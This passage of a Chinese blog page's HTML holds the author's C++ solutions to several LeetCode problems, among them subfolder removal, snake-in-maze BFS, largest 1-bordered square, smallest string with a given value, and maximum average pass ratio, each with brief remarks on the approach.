i++;</span><br><span class="line">                &#125;</span><br><span class="line">                path.<span class="built_in">push_back</span>(dir);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>模拟，构造那棵树，删除，然后还原</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行用时：620 ms, 在所有 C++ 提交中击败了5.15%的用户</span><br><span class="line">内存消耗：213.6 MB, 在所有 C++ 提交中击败了4.99%的用户</span><br></pre></td></tr></table></figure><blockquote><p>我不管，这是<code>O(n)</code>，就是最快的</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">removeSubfolders</span><span class="params">(vector&lt;string&gt;&amp; folder)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(folder.<span class="built_in">begin</span>(), folder.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> cmp = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">1</span>, n = folder.<span class="built_in">size</span>(), cmp_len = folder[cmp].<span class="built_in">length</span>();</span><br><span class="line">        res.<span class="built_in">push_back</span>(folder[cmp]);</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> j;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; cmp_len &amp;&amp; folder[cmp][j] == folder[i][j]; j++);</span><br><span class="line">            <span class="keyword">if</span>(j == cmp_len &amp;&amp; folder[i][j] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmp = i;</span><br><span class="line">                cmp_len = folder[cmp].<span class="built_in">length</span>();</span><br><span class="line">                res.<span class="built_in">push_back</span>(folder[cmp]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>排序，比较</p></blockquote><h2 id="1210-穿过迷宫的最少移动次数"><a href="#1210-穿过迷宫的最少移动次数" class="headerlink" title="1210. 穿过迷宫的最少移动次数"></a><a href="https://leetcode.cn/problems/minimum-moves-to-reach-target-with-rotations/">1210. 穿过迷宫的最少移动次数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumMoves</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        n = grid.<span class="built_in">size</span>();</span><br><span class="line">        queue&lt;pair&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, <span class="type">int</span>&gt;&gt; que;</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt;&gt; <span class="built_in">visited</span>(n, vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt;(n, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">2</span>, <span class="literal">false</span>)));</span><br><span class="line">        que.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="built_in">make_pair</span>(<span class="number">0</span>,<span class="number">0</span>),<span class="number">0</span>));</span><br><span class="line">        <span class="type">int</span> step = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            queue&lt;pair&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, <span class="type">int</span>&gt;&gt; que_temp;</span><br><span class="line">            <span class="keyword">while</span>(!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                <span class="keyword">auto</span> [pos, ver] = que.<span class="built_in">front</span>();</span><br><span class="line">                <span class="keyword">auto</span> [x, y] = pos;</span><br><span class="line">                visited[x][y][ver] = <span class="literal">true</span>;</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(x == n<span class="number">-1</span> &amp;&amp; y == n<span class="number">-2</span> &amp;&amp; !ver) &#123;<span class="keyword">return</span> step;&#125;</span><br><span class="line">                <span class="keyword">if</span>(ver) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(x+<span class="number">2</span> &lt; n &amp;&amp; !grid[x+<span class="number">2</span>][y]) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(!visited[x+<span class="number">1</span>][y][<span class="number">1</span>]) &#123;</span><br><span class="line">                            que_temp.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="built_in">make_pair</span>(x+<span class="number">1</span>,y),<span class="number">1</span>));</span><br><span class="line">                            visited[x+<span class="number">1</span>][y][<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(y+<span class="number">1</span> &lt; n &amp;&amp; x+<span class="number">1</span> &lt; n &amp;&amp; !grid[x][y+<span class="number">1</span>] &amp;&amp; !grid[x+<span class="number">1</span>][y+<span class="number">1</span>]) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(!visited[x][y][<span class="number">0</span>]) &#123;</span><br><span class="line">                            que_temp.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="built_in">make_pair</span>(x,y),<span class="number">0</span>));</span><br><span class="line">                            visited[x][y][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(!visited[x][y+<span class="number">1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">                            que_temp.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="built_in">make_pair</span>(x,y+<span class="number">1</span>),<span class="number">1</span>));</span><br><span class="line">                            visited[x][y+<span class="number">1</span>][<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(y+<span class="number">2</span> &lt; n &amp;&amp; !grid[x][y+<span class="number">2</span>]) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(!visited[x][y+<span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">                            que_temp.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="built_in">make_pair</span>(x,y+<span class="number">1</span>),<span class="number">0</span>));</span><br><span class="line">                            visited[x][y+<span class="number">1</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(y+<span class="number">1</span> &lt; n &amp;&amp; x+<span class="number">1</span> &lt; n &amp;&amp; !grid[x+<span class="number">1</span>][y] &amp;&amp; !grid[x+<span class="number">1</span>][y+<span class="number">1</span>]) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(!visited[x][y][<span class="number">1</span>]) &#123;</span><br><span class="line">                            que_temp.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="built_in">make_pair</span>(x,y),<span class="number">1</span>));</span><br><span class="line">                            visited[x][y][<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(!visited[x+<span class="number">1</span>][y][<span class="number">0</span>]) &#123;</span><br><span class="line">                            que_temp.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="built_in">make_pair</span>(x+<span class="number">1</span>,y),<span class="number">0</span>));</span><br><span class="line">                            visited[x+<span class="number">1</span>][y][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            step++;</span><br><span class="line">            que = que_temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>经典的BFS</p></blockquote><h2 id="2341-数组能形成多少数对"><a href="#2341-数组能形成多少数对" class="headerlink" title="2341. 数组能形成多少数对"></a><a href="https://leetcode.cn/problems/maximum-number-of-pairs-in-array/">2341. 数组能形成多少数对</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numberOfPairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">bool</span>&gt; m;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n:nums) &#123;</span><br><span class="line">            <span class="keyword">if</span>(m.<span class="built_in">count</span>(n)) &#123;</span><br><span class="line">                m[n] = !m[n];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                m[n] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite = m.<span class="built_in">begin</span>(); ite != m.<span class="built_in">end</span>(); ite++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ite-&gt;second) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;(len - res) &gt;&gt; <span class="number">1</span>, res&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1139-最大的以-1-为边界的正方形"><a href="#1139-最大的以-1-为边界的正方形" class="headerlink" title="1139. 最大的以 1 为边界的正方形"></a><a href="https://leetcode.cn/problems/largest-1-bordered-square/">1139. 最大的以 1 为边界的正方形</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">largest1BorderedSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">up</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>)), <span class="built_in">down</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>)), <span class="built_in">left</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>)), <span class="built_in">right</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            left[i][<span class="number">0</span>] = grid[i][<span class="number">0</span>];</span><br><span class="line">            right[i][n<span class="number">-1</span>] = grid[i][n<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]) left[i][j] = left[i][j<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> left[i][j] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][n<span class="number">-1</span>-j]) right[i][n<span class="number">-1</span>-j] = right[i][n-j] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> right[i][n<span class="number">-1</span>-j] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            up[<span class="number">0</span>][i] = grid[<span class="number">0</span>][i];</span><br><span class="line">            down[m<span class="number">-1</span>][i] = grid[m<span class="number">-1</span>][i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[j][i]) up[j][i] = up[j<span class="number">-1</span>][i] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> up[j][i] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span>(grid[m<span class="number">-1</span>-j][i]) down[m<span class="number">-1</span>-j][i] = down[m-j][i] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> down[m<span class="number">-1</span>-j][i] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> maxx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]) &#123;</span><br><span class="line">                    <span class="type">int</span> diff = <span class="built_in">min</span>(down[i][j], right[i][j]);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> l = <span class="number">0</span>; l &lt; diff; l++) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(l-up[i+l][j+l]+<span class="number">1</span> &lt;= <span class="number">0</span> &amp;&amp; l-left[i+l][j+l]+<span class="number">1</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            maxx = <span class="built_in">max</span>(maxx, l+<span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx*maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>记录上下左右四个方向从位置(i, j)开始连续的1的个数<br>对于一个为1的点，在其下方和右方有连续1的范围内的斜对角上的各点，如果斜对角线上各点的上方和左方能和(i,j)的下方和右方围成正方形，则更新最大值。</p></blockquote><h2 id="1663-具有给定数值的最小字符串"><a href="#1663-具有给定数值的最小字符串" class="headerlink" title="1663. 具有给定数值的最小字符串"></a><a href="https://leetcode.cn/problems/smallest-string-with-a-given-numeric-value/">1663. 具有给定数值的最小字符串</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">getSmallestString</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="function">string <span class="title">res</span><span class="params">(n, <span class="string">&#x27;a&#x27;</span><span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            res[i] += <span class="built_in">min</span>(<span class="number">26</span>, k-i);</span><br><span class="line">            k -= <span class="built_in">min</span>(<span class="number">26</span>, k-i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">getSmallestString</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="function">string <span class="title">res</span><span class="params">(n, <span class="string">&#x27;a&#x27;</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> i = n<span class="number">-1</span>;</span><br><span class="line">        k-=n;</span><br><span class="line">        <span class="keyword">for</span>( ; k &gt;= <span class="number">26</span>; i--) &#123;</span><br><span class="line">            res[i] += <span class="number">25</span>;</span><br><span class="line">            k -= <span class="number">25</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[i] += k;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1237-找出给定方程的正整数解"><a href="#1237-找出给定方程的正整数解" class="headerlink" title="1237. 找出给定方程的正整数解"></a>1237. 找出给定方程的正整数解</h2><h3 id="暴力搜索"><a href="#暴力搜索" class="headerlink" title="暴力搜索"></a>暴力搜索</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">findSolution</span>(CustomFunction&amp; customfunction, <span class="type">int</span> z) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">        <span class="keyword">for</span>(x = <span class="number">1</span>; x &lt;= <span class="number">1000</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(y = <span class="number">1000</span>; y &gt; <span class="number">1</span> &amp;&amp; customfunction.<span class="built_in">f</span>(x,y) &gt; z; y--);</span><br><span class="line">            <span class="keyword">if</span>(customfunction.<span class="built_in">f</span>(x,y) == z) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(&#123;x, y&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">findSolution</span>(CustomFunction&amp; customfunction, <span class="type">int</span> z) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">        <span class="keyword">for</span>(x = <span class="number">1</span>; x &lt;= <span class="number">1000</span>; x++) &#123;</span><br><span class="line">            <span class="type">int</span> l = <span class="number">1</span>, r = <span class="number">1001</span>;</span><br><span class="line">            <span class="keyword">while</span>(l &lt;= r) &#123;</span><br><span class="line">                y = (r - l) / <span class="number">2</span> + l;</span><br><span class="line">                <span class="keyword">if</span>(customfunction.<span class="built_in">f</span>(x, y) == z) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span>(customfunction.<span class="built_in">f</span>(x,y) &gt; z) r = y<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">else</span> l = y+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(customfunction.<span class="built_in">f</span>(x,y) == z) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(&#123;x, y&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>由于是增函数，则确定x，y可以二分</p></blockquote><h3 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">findSolution</span>(CustomFunction&amp; customfunction, <span class="type">int</span> z) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">for</span>(x = <span class="number">1</span>; x &lt;= <span class="number">1000</span>; x++) &#123;</span><br><span class="line">            <span class="type">int</span> l = <span class="number">1</span>, r = <span class="number">1001</span>;</span><br><span class="line">            <span class="keyword">for</span>(; y &gt; <span class="number">1</span> &amp;&amp; customfunction.<span class="built_in">f</span>(x, y) &gt; z; y--);</span><br><span class="line">            <span class="keyword">if</span>(customfunction.<span class="built_in">f</span>(x,y) == z) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(&#123;x, y&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>由于是递增的，x增大y必然要减少</p></blockquote><h2 id="1792-最大平均通过率"><a href="#1792-最大平均通过率" class="headerlink" title="1792. 最大平均通过率"></a><a href="https://leetcode.cn/problems/maximum-average-pass-ratio/">1792. 最大平均通过率</a></h2><h3 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">maxAverageRatio</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; classes, <span class="type">int</span> extraStudents)</span> </span>&#123;</span><br><span class="line">        <span class="type">double</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = classes.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; extraStudents; i++) &#123;</span><br><span class="line">            <span class="type">double</span> max_res = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                <span class="type">double</span> diff = (classes[j][<span class="number">0</span>]+<span class="number">1.0</span>) / (classes[j][<span class="number">1</span>] + <span class="number">1</span>) - <span class="number">1.0</span>*classes[j][<span class="number">0</span>]/classes[j][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(diff &gt; max_res) &#123;</span><br><span class="line">                    max_res = diff;</span><br><span class="line">                    p = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            classes[p][<span class="number">0</span>]++;</span><br><span class="line">            classes[p][<span class="number">1</span>]++;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; p &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            res += <span class="number">1.0</span>*classes[j][<span class="number">0</span>]/classes[j][<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span 